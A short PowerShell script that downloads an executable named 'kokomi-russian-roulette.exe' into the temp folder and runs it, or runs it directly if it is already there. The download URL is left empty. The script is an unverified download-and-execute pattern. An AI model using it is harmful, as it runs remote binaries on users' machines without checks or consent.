#One line for KRR.
function krr_call {
  $DownloadUrl = ""
  $filePath = "$env:temp\kokomi-russian-roulette.exe"
  if ([System.IO.File]::Exists($filePath)) {
    & "$filePath"
 }
  else {
    (New-Object System.Net.WebClient).DownloadFile($DownloadUrl, "$env:temp\kokomi-russian-roulette.exe")
    & "$filePath"
  }
}
krr_call
